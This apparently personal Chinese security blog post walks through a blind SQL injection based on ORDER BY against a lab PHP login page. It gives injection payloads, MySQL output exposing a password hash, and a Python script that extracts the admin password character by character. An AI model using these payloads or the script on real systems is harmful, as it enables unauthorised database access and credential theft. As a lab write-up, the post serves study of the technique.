@@ -1,0 +1,467 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>基于order by的盲注 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="http://wonderkun.cc/index.html/?p=547源代码:
+&amp;lt;?php
+  $dbhost &amp;#x3D; &amp;quot;172.19.0.2&amp;quot;;
+  $dbuser &amp;#x3D; &amp;quot;root&amp;quot;;
+  $dbpass &amp;#x3D; &amp;quot;root&amp;quot;;
+  $db &amp;#x3D; &amp;quot;vul&amp;quot;;
+  $conn &amp;#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
+  mysqli_set_charset($conn,&amp;quot;utf8&amp;quot;);
+ 
+  &amp;#x2F;* sql
+ 
+     create  table &amp;#96;admin&amp;#96; (
+        &amp;#96;id&amp;#96; int(10) not null primary key auto_increment,
+        &amp;#96;username&amp;#96; varchar(20) not null ,
+        &amp;#96;password&amp;#96; varchar(32) not null
+     );
+  *&amp;#x2F;
+function   filter($str)&amp;#123;
+      $filterlist &amp;#x3D; &amp;quot;&amp;#x2F;\(|\)|username|password|where|
+      case|when|like|regexp|into|limit|&amp;#x3D;|for|;&amp;#x2F;&amp;quot;;
+      if(preg_match($filterlist,strtolower($str)))&amp;#123;
+        die(&amp;quot;illegal input!&amp;quot;);
+      &amp;#125;
+      return $str;
+  &amp;#125;
+$username &amp;#x3D; isset($_POST[&amp;#39;username&amp;#39;])?
+filter($_POST[&amp;#39;username&amp;#39;]):die(&amp;quot;please input username!&amp;quot;);
+$password &amp;#x3D; isset($_POST[&amp;#39;password&amp;#39;])?
+filter($_POST[&amp;#39;password&amp;#39;]):die(&amp;quot;please input password!&amp;quot;);
+$sql &amp;#x3D; &amp;quot;select * from admin where  username &amp;#x3D;
+ &amp;#39;$username&amp;#39; and password &amp;#x3D; &amp;#39;$password&amp;#39; &amp;quot;;
+ 
+$res &amp;#x3D; $conn -&amp;gt; query($sql);
+if($res-&amp;gt;num_rows&amp;gt;0)&amp;#123;
+  $row &amp;#x3D; $res -&amp;gt; fetch_assoc();
+  if($row[&amp;#39;id&amp;#39;])&amp;#123;
+     echo $row[&amp;#39;username&amp;#39;];
+  &amp;#125;
+&amp;#125;else&amp;#123;
+   echo &amp;quot;The content in the password column is the &amp;quot;;
+&amp;#125;
+ 
+?&amp;gt;
+
+在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是
+username&amp;#x3D;&amp;#39;^1^1#&amp;amp;password&amp;#x3D;1
+
+其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：
+
+就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：
+select * from admin where username&amp;#x3D;&amp;#39;&amp;#39;*0
+select * from admin where username&amp;#x3D;&amp;#39;&amp;#39;&amp;#x2F;2
+select * from admin where username&amp;#x3D;&amp;#39;&amp;#39;^1^1
+select * from admin where username&amp;#x3D;&amp;#39;&amp;#39;-&amp;#39;&amp;#39;
+
+然后是基于order by的盲注：
+首先是基本知识:"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="基于order by的盲注"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 基于order by的盲注</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=547">http://wonderkun.cc/index.html/?p=547</a><br>源代码:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+  $dbhost &#x3D; &quot;172.19.0.2&quot;;
+  $dbuser &#x3D; &quot;root&quot;;
+  $dbpass &#x3D; &quot;root&quot;;
+  $db &#x3D; &quot;vul&quot;;
+  $conn &#x3D; mysqli_connect($dbhost,$dbuser,$dbpass,$db);
+  mysqli_set_charset($conn,&quot;utf8&quot;);
+ 
+  &#x2F;* sql
+ 
+     create  table &#96;admin&#96; (
+        &#96;id&#96; int(10) not null primary key auto_increment,
+        &#96;username&#96; varchar(20) not null ,
+        &#96;password&#96; varchar(32) not null
+     );
+  *&#x2F;
+function   filter($str)&#123;
+      $filterlist &#x3D; &quot;&#x2F;\(|\)|username|password|where|
+      case|when|like|regexp|into|limit|&#x3D;|for|;&#x2F;&quot;;
+      if(preg_match($filterlist,strtolower($str)))&#123;
+        die(&quot;illegal input!&quot;);
+      &#125;
+      return $str;
+  &#125;
+$username &#x3D; isset($_POST[&#39;username&#39;])?
+filter($_POST[&#39;username&#39;]):die(&quot;please input username!&quot;);
+$password &#x3D; isset($_POST[&#39;password&#39;])?
+filter($_POST[&#39;password&#39;]):die(&quot;please input password!&quot;);
+$sql &#x3D; &quot;select * from admin where  username &#x3D;
+ &#39;$username&#39; and password &#x3D; &#39;$password&#39; &quot;;
+ 
+$res &#x3D; $conn -&gt; query($sql);
+if($res-&gt;num_rows&gt;0)&#123;
+  $row &#x3D; $res -&gt; fetch_assoc();
+  if($row[&#39;id&#39;])&#123;
+     echo $row[&#39;username&#39;];
+  &#125;
+&#125;else&#123;
+   echo &quot;The content in the password column is the &quot;;
+&#125;
+ 
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在上面这个源代码里面，要首先猜解出username的值，文章里面给的payload是</p>
+<pre class="line-numbers language-none"><code class="language-none">username&#x3D;&#39;^1^1#&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>其实上面的payload初看是不太懂的，才想起来mysql里面弱类型转换的问题，如下：</p>
+<p><img src="/2017/11/23/order-by-blind/2.png"></p>
+<p>就是sql语句查询如果username是0的话，所有结果就出来了，那么把这个username变成0，上面的语句都可以做到：</p>
+<pre class="line-numbers language-none"><code class="language-none">select * from admin where username&#x3D;&#39;&#39;*0
+select * from admin where username&#x3D;&#39;&#39;&#x2F;2
+select * from admin where username&#x3D;&#39;&#39;^1^1
+select * from admin where username&#x3D;&#39;&#39;-&#39;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后是基于order by的盲注：</p>
+<p>首先是基本知识:</p>
+<pre class="line-numbers language-none"><code class="language-none">import sting
+string.maketrans(&#39;&#39;,&#39;&#39;)[33:127]
+&#39;!&quot;#$%&amp;\&#39;()*+,-.&#x2F;0123456789:;&lt;&#x3D;&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_&#96;abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>mysql里面的字符串会默认按照上面这个数值的大小从小到大排列，看下图：</p>
+<p><img src="/2017/11/23/order-by-blind/3.png"></p>
+<p>比719大的字符串是<code>719;</code>，但是直接比较的话，mysql是会出错的。所以需要转换为16进制来比较。</p>
+<p>总的来说就是拿16进制之后的字符串和admin的密码进行比较，比admin大的话，按照上面php的逻辑，在username为admin2的情况下</p>
+<pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin2&#39; union select 1,2,0x37313921 order by 3 desc#&amp;password&#x3D;1 &#x2F;&#x2F;返回结果admin2
+
+username&#x3D;admin2&#39; union select 1,2,0x3731393B order by 3 desc#&amp;password&#x3D;1 &#x2F;&#x2F;返回结果是2
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>另外跑出来的都会是大写，看下面的语句:</p>
+<pre class="line-numbers language-none"><code class="language-none">mysql&gt; select hex(&#39;c&#39;);
++----------+
+| hex(&#39;c&#39;) |
++----------+
+| 63       |
++----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select hex(&#39;C&#39;);
++----------+
+| hex(&#39;C&#39;) |
++----------+
+| 43       |
++----------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from admin   where id&#x3D;2 union select 1,2,0x3731393563 order by 3 desc;
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  2 | admin2   | 7195ca99696b5a896d067a0fa9dc61a6 |
+|  1 | 2        | 7195c                            |
++----+----------+----------------------------------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from admin   where id&#x3D;2 union select 1,2,0x3731393543 order by 3 desc;
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  2 | admin2   | 7195ca99696b5a896d067a0fa9dc61a6 |
+|  1 | 2        | 7195C                            |
++----+----------+----------------------------------+
+2 rows in set (0.00 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在mysql里面大小写比较是一样的，即使实际上<code>c</code>的hex要比<code>C</code>大，在python脚本里面按照排列算的话，大写在前面。</p>
+<del>
+貌似这里可以分辨大小写的，因为大小写中间有
+[\]^_`
+字符串，拿这个和他比。所以比较的时候要出现两次，第一次肯定是大写，如果再和上面的字符串hex比较，结果一样的话
+</del>
+
+<p>上面实际测试，大小写和<code>^</code>比较结果一样，然后费了点时间自己下个脚本复现了下，最后的脚本(中间加的没用的东西是自己调试用的）:</p>
+<pre class="line-numbers language-none"><code class="language-none">#&#x2F;usr&#x2F;bin&#x2F;env python
+# coding: utf-8
+
+import string
+import requests
+
+cest &#x3D; string.maketrans(&#39;&#39;, &#39;&#39;)[33:127]
+url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;c.php&quot;
+res &#x3D; &#39;&#39;
+i &#x3D; 0
+while 1:
+	# payload &#x3D; res.strip(&#39;&#39;).encode(&#39;hex&#39;) + cest[i:i+1].encode(&#39;hex&#39;)
+	payload &#x3D; (res + cest[i:i+1]).encode(&#39;hex&#39;)
+	tmp &#x3D; &#123;&#39;username&#39;: &quot;admin&#39; union select 1,2,0x&quot;+ payload + &quot; order by 3 desc#&quot;, &quot;password&quot;: &#39;1&#39;&#125;
+	req &#x3D; requests.post(url, data&#x3D;tmp, headers&#x3D;&#123;&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8&quot;&#125; )
+	c &#x3D; req.content
+	b &#x3D; req.content.find(&#39;admin&#39;)
+	if req.content.find(&#39;admin&#39;) !&#x3D; -1:
+		i +&#x3D; 1
+		continue
+	else:
+		res &#x3D; res + chr(ord(cest[i]) - 1)
+		print res
+		i &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最后，如果要实战中成功条件：</p>
+<ul>
+<li>确定union的列数</li>
+<li>有二值判断的逻辑存在</li>
+</ul>
+<p>貌似没了。。。想到再补充吧。</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/11/23/order-by-blind.html" class="leancloud-visitors view" data-flag-title="基于order by的盲注">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/11/28/sql-bypass-unknown.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/11/02/naxsi.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-11-23 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
